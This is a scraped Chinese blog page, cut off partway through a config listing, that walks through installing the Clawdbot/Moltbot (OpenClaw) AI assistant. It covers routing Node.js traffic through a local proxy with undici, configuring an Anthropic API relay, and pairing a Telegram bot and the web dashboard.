<pre><code class="hljs language-bash" lang="bash">openclaw gateway --verbose
</code></pre>
<p>终端会运行 clawdbot服务，可以保持这个终端的状态，打开一个新的终端，输入</p>
<pre><code class="hljs language-bash" lang="bash">openclaw dashboard
</code></pre>
<p>生成了一个带有token的链接，打开它。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c36cf640e009477ea7c58fbb221662e6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgbHVrYTEwMTI=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770372241&amp;x-signature=DmHfh%2FxQvBH9G88PMG%2FemDZCjFM%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7c5a6326fcf54ef89573b40111546ab5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgbHVrYTEwMTI=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770372241&amp;x-signature=hAhiO1gCQ55y1WygeVvbJCFc6TM%3D" alt="image.png" loading="lazy"/></p>
<p>到这就已”基本成功“。</p>
<p>配置API方法 ：<a href="https://juejin.cn/post/7600953879500619827" target="_blank" title="https://juejin.cn/post/7600953879500619827">openclaw UI方式配置API在执行 openclaw dashborad 指令后打开带有token的url链接， - 掘金</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Clawdbot/Moltbot：对接Telegram配置实录（附有LLM 摘要）]]></title>    <link>https://juejin.cn/post/7600752623068741642</link>    <guid>https://juejin.cn/post/7600752623068741642</guid>    <pubDate>2026-01-30T09:32:04.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600752623068741642" data-draft-id="7600967006892949513" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Clawdbot/Moltbot：对接Telegram配置实录（附有LLM 摘要）"/> <meta itemprop="keywords" content="人工智能,AIGC"/> <meta itemprop="datePublished" content="2026-01-30T09:32:04.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="yezannnnnn"/> <meta itemprop="url" content="https://juejin.cn/user/958429869908247"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Clawdbot/Moltbot：对接Telegram配置实录（附有LLM 摘要）
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/958429869908247/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    yezannnnnn
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T09:32:04.000Z" title="Fri Jan 30 2026 09:32:04 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{font-family:-apple-system,system-ui,Segoe UI,Roboto,Ubuntu,Cantarell,Noto Sans,sans-serif,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial;color:#00325e}.markdown-body ::selection{background-color:#00325e;color:#fff}.markdown-body blockquote{padding:10px 20px;background-color:#fffaf0;box-shadow:0 3px 10px 0 rgba(255,172,194,.24);border:1px solid #f3ca8e;transition:all .2s;margin:1em 0;border-radius:5px}.markdown-body blockquote p{font-size:14px;line-height:25px;color:#795548}.markdown-body blockquote p:last-child{margin:0}.markdown-body blockquote:hover{border-color:#ff9800;background-color:#fff8e0;box-shadow:0 6px 10px -5px rgba(225,173,98,.3803921569)}.markdown-body blockquote code{color:#ff502c}.markdown-body pre{border:1px solid #8cc0f3;box-shadow:0 3px 10px 0 rgba(255,198,198,.28);border-radius:5px;transition:all .2s;overflow-x:auto;white-space:pre-wrap}.markdown-body pre:hover{border-color:#6d9dce}.markdown-body pre&gt;code{padding:10px 20px;color:#00325e;background:#f0f8ff;font-size:12px;line-height:1.6;display:block}.markdown-body code{background:#f6fbff;color:#0b5393;padding:2px 4px;border-radius:4px;font-size:12px}.markdown-body p{font-size:14px;line-height:28px;text-align:justify;margin-bottom:17px;color:#595959}.markdown-body a{color:#00325e;text-decoration:none}.markdown-body a:after{content:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAoAAAAKCAYAAACNMs+9AAAAAXNSR0IArs4c6QAAAQdJREFUKFNt0DtLA0EUBeBzZle0Eks7rcUfEfBRCha7NorYa6NmVJzgyi4smUgKtdZGCJktLMVH4Y8QeztLWyE7VyLEuNFbXj4Oh0P8c8mZm+uJrEN4BJFTeP/MUVe3bnocfALwkOlo1zS7iZAzf6Cx7oXgbaqjxiDEWCcVaGyxQ8pSWo9XhqhoQ/xUFbaKjhe5V+CmR7mnSplEEF6GSmJ+F/d0KHvbCIIJCLc85U6BC5mONgbJNM3uFag++sX7z8O8MzsWBucifMx0dDGE1kmm458KDVukAlnNdDz/exEeW3dNkbfsYC0xtmgDWP6ELLZ0/F6BJu/UoFQN5AkoeUjeJPvx6+i+X5Sjah4tA6gYAAAAAElFTkSuQmCC);margin-left:2px}.markdown-body a:hover{box-shadow:0 1px}.markdown-body table{max-width:100%;border-collapse:collapse;border-spacing:0;box-shadow:0 3px 10px 0 rgba(255,238,172,.24);transition:all .2s}.markdown-body table:hover{box-shadow:0 3px 10px 0 rgba(185,169,103,.24)}.markdown-body table tr th{border:1px solid #8cc0f3;background-color:#f0f8ff;padding:12px 15px}.markdown-body table tr td{border:1px solid rgba(243,202,142,.4);padding:12px 15px}.markdown-body table tbody tr{transition:all .2s}.markdown-body table tbody tr:hover td{border-color:#f3ca8e;background-color:#fff8e0;z-index:1}.markdown-body img{max-width:100%}.markdown-body h1{font-size:20px;margin-top:30px;margin-bottom:10px;padding-left:30px;position:relative}.markdown-body h1&gt;code{font-size:20px}.markdown-body h1:before{content:"🍺";display:block;font-size:18px;width:18px;height:18px;left:0;position:absolute}.markdown-body h2{font-size:18px;margin-top:30px;margin-bottom:10px;padding-left:28px;position:relative}.markdown-body h2&gt;code{font-size:18px}.markdown-body h2:before{content:"🍻";display:block;font-size:16px;width:16px;height:16px;left:0;position:absolute}.markdown-body h3{font-size:16px;margin-top:30px;margin-bottom:10px;padding-left:26px;position:relative}.markdown-body h3&gt;code{font-size:16px}.markdown-body h3:before{content:"🥂";display:block;font-size:14px;width:14px;height:14px;left:0;position:absolute}.markdown-body h4{font-size:14px;margin-top:30px;margin-bottom:10px;padding-left:24px;position:relative}.markdown-body h4&gt;code{font-size:14px}.markdown-body h4:before{content:"🥃";display:block;font-size:12px;width:12px;height:12px;left:0;position:absolute}.markdown-body h5{font-size:12px;margin-top:30px;margin-bottom:10px}.markdown-body h5&gt;code{font-size:12px}.markdown-body h6{font-size:10px;margin-top:30px;margin-bottom:10px}.markdown-body h6&gt;code{font-size:10px}.markdown-body h1,.markdown-body h2{color:#ff502c}.markdown-body hr{height:4px;border:none;margin-top:32px;margin-bottom:32px;background-size:4px 1px;background-image:linear-gradient(270deg,#6d9dce,#8cc0f3 25%,transparent 50%)}.markdown-body hr:nth-child(2n){background-image:linear-gradient(270deg,#ff9800,#fff8e0 25%,transparent 50%)}.markdown-body ul{padding-inline-start:20px}.markdown-body ul li{list-style-type:"🔸"}.markdown-body ul li li{list-style-type:"◻️"}.markdown-body ul li li li{list-style-type:"▫️"}.markdown-body ol{padding-inline-start:20px}.markdown-body ol ::marker{color:#ff9800}.markdown-body ol,.markdown-body ul{line-height:2em}.markdown-body li{padding-inline-start:1ch}.markdown-body li.task-list-item{list-style:none;padding-inline-start:0}.markdown-body li input{padding-right:2px}.markdown-body li input[type=checkbox i]{appearance:none}.markdown-body li input:before{content:"🟩";display:block;width:13px;height:13px}.markdown-body li input:checked:before{content:"✅"}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="atelier-sulphurpool-light">.hljs-comment,.hljs-quote{color:#6b7394}.hljs-attribute,.hljs-link,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#c94922}.hljs-built_in,.hljs-builtin-name,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#c76b29}.hljs-bullet,.hljs-string,.hljs-symbol{color:#ac9739}.hljs-section,.hljs-title{color:#3d8fd1}.hljs-keyword,.hljs-selector-tag{color:#6679cc}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#f5f7ff;color:#5e6687}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Clawdbot/Moltbot：对接Telegram配置实录</h2>
<blockquote>
<p>从安装到 Telegram 集成，一个折腾了数小时的真实经历</p>
</blockquote>
<h3 data-id="heading-1">前言</h3>
<p>Clawdbot（现已更名为 Moltbot）是一个开源的本地 AI 助手，可以通过 Telegram、WhatsApp、Discord 等消息应用与 Claude 模型交互。本文记录了在特殊网络环境下配置 Clawdbot 的完整过程，包括遇到的各种问题和解决方案。</p>
<p><strong>环境信息：</strong></p>
<ul>
<li>操作系统：macOS 14.5</li>
<li>Node.js：v22.22.0</li>
<li>Clawdbot 版本：2026.1.24-3</li>
<li>网络环境：需要魔法上网访问境外服务</li>
</ul>
<hr/>
<h3 data-id="heading-2">一、安装 Clawdbot</h3>
<h4 data-id="heading-3">1.1 前置条件</h4>
<p>确保 Node.js 版本不低于 22.0.0：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 使用 nvm 安装</span>
nvm install 22
nvm use 22
nvm <span class="hljs-built_in">alias</span> default 22

<span class="hljs-comment"># 验证版本</span>
node --version  <span class="hljs-comment"># 应显示 v22.x.x</span>
</code></pre>
<h4 data-id="heading-4">1.2 全局安装</h4>
<pre><code class="hljs language-bash" lang="bash">npm install -g clawdbot
</code></pre>
<h4 data-id="heading-5">1.3 初始化配置</h4>
<pre><code class="hljs language-bash" lang="bash">clawdbot onboard
</code></pre>
<p>配置向导会引导你完成基本设置：</p>
<pre><code class="hljs language-vbnet" lang="vbnet">🦞 Clawdbot <span class="hljs-number">2026.1</span>.<span class="hljs-number">24</span>-<span class="hljs-number">3</span>
│
◇  安全提示 ───────────────────────────────────────────────────╮
│  Clawdbot 可以运行命令、读写文件，请确保了解相关风险。        │
├──────────────────────────────────────────────────────────────╯
│
◇  我已了解风险，继续？
│  是
│
◇  选择模型/认证提供商
│  Anthropic
│
◇  选择认证方式
│  Anthropic API <span class="hljs-keyword">key</span>
</code></pre>

<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/455024c278a5446dab4debca9ced00af~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgeWV6YW5ubm5ubg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770370826&amp;x-signature=1SC%2B7yAyhQf0De300pq0FYMl0oE%3D" alt="image.png" loading="lazy"/></p>
<hr/>
<h3 data-id="heading-6">二、API 代理配置（推荐方案）</h3>
<p>对于需要魔法上网的用户，使用第三方 API 代理服务是最稳定的方案。</p>
<h4 data-id="heading-7">2.1 配置文件结构</h4>
<pre><code class="hljs language-bash" lang="bash">~/.clawdbot/
├── clawdbot.json                    <span class="hljs-comment"># 主配置文件</span>
└── agents/
    └── main/
        └── agent/
            └── auth-profiles.json   <span class="hljs-comment"># 认证配置文件</span>
</code></pre>
<h4 data-id="heading-8">2.2 主配置文件</h4>
<p><strong>文件位置：</strong> <code>~/.clawdbot/clawdbot.json</code></p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"models"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"providers"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"anthropic"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"baseUrl"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"https://你的代理地址.com"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"apiKey"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"你的API密钥"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"api"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"anthropic-messages"</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">"models"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">]</span>
      <span class="hljs-punctuation">}</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"agents"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"defaults"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"model"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"primary"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"anthropic/claude-sonnet-4-5-20250929"</span>
      <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"workspace"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"/Users/你的用户名/clawd"</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h4 data-id="heading-9">2.3 关键配置项说明</h4>






























<table><thead><tr><th>字段</th><th>说明</th><th align="center">必需</th></tr></thead><tbody><tr><td><code>baseUrl</code></td><td>API 代理地址</td><td align="center">✅</td></tr><tr><td><code>apiKey</code></td><td>代理服务的 API 密钥</td><td align="center">✅</td></tr><tr><td><code>api</code></td><td><strong>必须</strong>设置为 <code>anthropic-messages</code></td><td align="center">✅</td></tr><tr><td><code>models</code></td><td><strong>必须</strong>包含此字段，可以为空数组 <code>[]</code></td><td align="center">✅</td></tr></tbody></table>
<blockquote>
<p>⚠️ <strong>踩坑点：</strong> 如果缺少 <code>api</code> 或 <code>models</code> 字段，会导致 HTTP 403 错误！这是我花了很长时间才发现的问题。</p>
</blockquote>
<h4 data-id="heading-10">2.4 认证配置文件</h4>
<p><strong>文件位置：</strong> <code>~/.clawdbot/agents/main/agent/auth-profiles.json</code></p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"version"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"profiles"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"anthropic:default"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"api_key"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"provider"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"anthropic"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"apiKey"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"你的API密钥"</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h4 data-id="heading-11">2.5 验证 API 配置</h4>
<p>配置完成后，用 curl 测试 API 是否可用：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ❌ 这里注意请求的model是自己令牌支持的！</span>
curl -H <span class="hljs-string">"x-api-key: 你的API密钥"</span> \
  -H <span class="hljs-string">"content-type: application/json"</span> \
  -H <span class="hljs-string">"anthropic-version: 2023-06-01"</span> \
  -d <span class="hljs-string">'{"model":"claude-sonnet-4-5-20250929","max_tokens":50,"messages":[{"role":"user","content":"你好"}]}'</span> \
  https://你的代理地址.com/v1/messages
</code></pre>
<p>预期返回类似：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"id"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"msg_xxx"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"message"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"role"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"assistant"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"content"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">{</span><span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"text"</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"text"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"你好！有什么我可以帮助你的吗？"</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">]</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<hr/>
<h3 data-id="heading-12">三、代理配置（核心难点）</h3>
<p>由于 Telegram API 需要魔法访问，这是配置中最复杂的部分。</p>
<h4 data-id="heading-13">3.1 问题：Node.js 不读取系统代理</h4>
<p>设置环境变量对 Node.js 22 的网络请求无效：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ❌ 这样做是无效的！</span>
<span class="hljs-built_in">export</span> HTTP_PROXY=http://127.0.0.1:1087
<span class="hljs-built_in">export</span> HTTPS_PROXY=http://127.0.0.1:1087
clawdbot gateway  <span class="hljs-comment"># Telegram 连接仍会失败</span>
</code></pre>
<p>会看到如下错误：</p>
<pre><code class="hljs language-csharp" lang="csharp">[<span class="hljs-meta">telegram</span>] telegram setMyCommands failed: HttpError: Network request failed!
[<span class="hljs-meta">clawdbot</span>] Unhandled promise rejection: TypeError: fetch failed
</code></pre>
<h4 data-id="heading-14">3.2 解决方案：使用 undici 代理</h4>
<blockquote>
<p>安装前请先有自己的梯子，笔者用的<strong>shadowsocks</strong>且代理端口1087</p>
</blockquote>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/53168b4ea2494604a783bd18331c2f2b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgeWV6YW5ubm5ubg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770370826&amp;x-signature=NZq8ORaJyAxIq7KtD2KITM8tM10%3D" alt="image.png" loading="lazy"/></p>
<p><strong>步骤一：安装 undici</strong></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4611913382d14081a6e3afa7a30924cc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgeWV6YW5ubm5ubg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770370826&amp;x-signature=O6QpF3f58%2BTfCWq%2BAgzixgUh5TQ%3D" alt="image.png" loading="lazy"/></p>
<pre><code class="hljs language-bash" lang="bash">npm install -g undici
</code></pre>
<p><strong>步骤二：创建代理配置脚本</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">cat</span> &gt; ~/proxy-setup.js &lt;&lt; <span class="hljs-string">'EOF'</span>
const { setGlobalDispatcher, ProxyAgent } = require(<span class="hljs-string">'undici'</span>);
setGlobalDispatcher(new ProxyAgent(<span class="hljs-string">'http://127.0.0.1:1087'</span>));
console.log(<span class="hljs-string">'[代理] 已设置全局代理: http://127.0.0.1:1087'</span>);
EOF
</code></pre>
<blockquote>
<p>注意：请将 <code>1087</code> 替换为你实际的代理端口</p>
</blockquote>
<p><strong>步骤三：创建启动脚本</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">cat</span> &gt; ~/start-clawdbot.sh &lt;&lt; <span class="hljs-string">'EOF'</span>
<span class="hljs-comment">#!/bin/bash</span>
NODE_PATH=$(npm root -g) node --require ~/proxy-setup.js $(<span class="hljs-built_in">which</span> clawdbot) gateway --port 18789
EOF

<span class="hljs-built_in">chmod</span> +x ~/start-clawdbot.sh
</code></pre>
<p><strong>步骤四：使用启动脚本运行</strong></p>
<pre><code class="hljs language-bash" lang="bash">~/start-clawdbot.sh
</code></pre>
<p>成功启动后会看到：</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-selector-attr">[代理]</span> 已设置全局代理: <span class="hljs-selector-tag">http</span>:<span class="hljs-comment">//127.0.0.1:1087</span>
🦞 <span class="hljs-selector-tag">Clawdbot</span> <span class="hljs-number">2026.1</span><span class="hljs-selector-class">.24-3</span>
<span class="hljs-selector-attr">[gateway]</span> 正在监听 <span class="hljs-selector-tag">ws</span>:<span class="hljs-comment">//127.0.0.1:18789</span>
<span class="hljs-selector-attr">[telegram]</span> <span class="hljs-selector-attr">[default]</span> 正在启动...
<span class="hljs-selector-attr">[telegram]</span> <span class="hljs-selector-attr">[default]</span> 启动成功 (@你的机器人名)
</code></pre>

<p>有这个红框表示telegram也成功连接</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3eaa8757d38e40df93fa345d9597701f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgeWV6YW5ubm5ubg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770370826&amp;x-signature=ClVetGDsnx8DMK8y5yw3gD8BcWo%3D" alt="image.png" loading="lazy"/></p>
<h4 data-id="heading-15">3.3 验证代理是否生效</h4>
<p>测试 Telegram API 连接：</p>
<pre><code class="hljs language-bash" lang="bash">curl -x http://127.0.0.1:1087 https://api.telegram.org/bot你的TOKEN/getMe
</code></pre>
<p>如果返回机器人信息，说明代理配置正确。</p>
<hr/>
<h3 data-id="heading-16">四、Telegram 机器人配置</h3>
<h4 data-id="heading-17">4.1 创建 Telegram 机器人</h4>
<ol>
<li>在 Telegram 搜索 <strong>@BotFather</strong></li>
<li>发送 <code>/newbot</code></li>
<li>按提示设置机器人名称和用户名</li>
<li>获取机器人 Token（格式类似 <code>123456789:ABCdefGHIjklMNOpqrsTUVwxyz</code>）</li>
</ol>
<h4 data-id="heading-18">4.2 配置 Clawdbot</h4>
<p>在 <code>~/.clawdbot/clawdbot.json</code> 中添加 Telegram 配置：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"channels"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"telegram"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"enabled"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"dmPolicy"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"pairing"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"botToken"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"你的机器人Token"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"groupPolicy"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"allowlist"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"streamMode"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"partial"</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h4 data-id="heading-19">4.3 配对你的 Telegram 账号</h4>
<ol>
<li>使用代理启动 Gateway：</li>
</ol>
<pre><code class="hljs language-bash" lang="bash">~/start-clawdbot.sh
</code></pre>
<ol start="2">
<li>
<p>在 Telegram 给你的机器人发送任意消息</p>
</li>
<li>
<p>机器人会回复配对码：</p>
</li>
</ol>

<pre><code class="hljs language-makefile" lang="makefile"><span class="hljs-section">Clawdbot: 访问未配置</span>

你的 Telegram 用户 ID: 123456789
<span class="hljs-section">配对码: ABC12345</span>

请机器人管理员执行以下命令批准：
clawdbot pairing approve telegram ABC12345

</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5597b49de3f347329f1787d65d5b9469~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgeWV6YW5ubm5ubg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770370826&amp;x-signature=6sRdy%2BYzIZO%2FtQVpY7XaAteSL1E%3D" alt="image.png" loading="lazy"/></p>
<ol start="4">
<li>在终端执行批准命令：</li>
</ol>
<pre><code class="hljs language-bash" lang="bash">clawdbot pairing approve telegram ABC12345
</code></pre>
<ol start="5">
<li>配对成功后即可正常对话</li>
</ol>

<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4b4fd1fef8da496680e68df3afaa25b4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgeWV6YW5ubm5ubg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770370826&amp;x-signature=uRAGH9BIbYm29iGyuqqOPcLDSZI%3D" alt="image.png" loading="lazy"/></p>
<hr/>
<h3 data-id="heading-20">五、Web 控制面板</h3>
<p>Clawdbot 提供了一个功能丰富的 Web 控制面板。</p>
<h4 data-id="heading-21">5.1 访问地址</h4>
<p>Gateway 启动后，访问：</p>
<pre><code class="hljs language-ini" lang="ini">http://127.0.0.1:18789/?<span class="hljs-attr">token</span>=你的gateway_token
</code></pre>
<p>或者使用命令自动打开：</p>
<pre><code class="hljs language-bash" lang="bash">clawdbot dashboard
</code></pre>
<h4 data-id="heading-22">5.2 主要功能</h4>
<ul>
<li><strong>💬 对话</strong>：直接与 AI 对话</li>
<li><strong>📊 概览</strong>：查看系统状态</li>
<li><strong>🔌 频道</strong>：管理 Telegram/WhatsApp 等连接</li>
<li><strong>📁 会话</strong>：查看和管理对话历史</li>
<li><strong>⚙️ 配置</strong>：修改各项设置</li>
</ul>
<p>笔者让他帮忙编写这篇文档</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2ece21d89f564b629c84877c8d5b72d2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgeWV6YW5ubm5ubg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770370826&amp;x-signature=gz1pbYCZC1eAM4O3SF8gCRFctI8%3D" alt="image.png" loading="lazy"/></p>
<hr/>
<h3 data-id="heading-23">六、完整配置文件参考</h3>
<h4 data-id="heading-24">6.1 主配置文件 <code>~/.clawdbot/clawdbot.json</code></h4>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"meta"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"lastTouchedVersion"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"2026.1.24-3"</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"models"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"providers"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
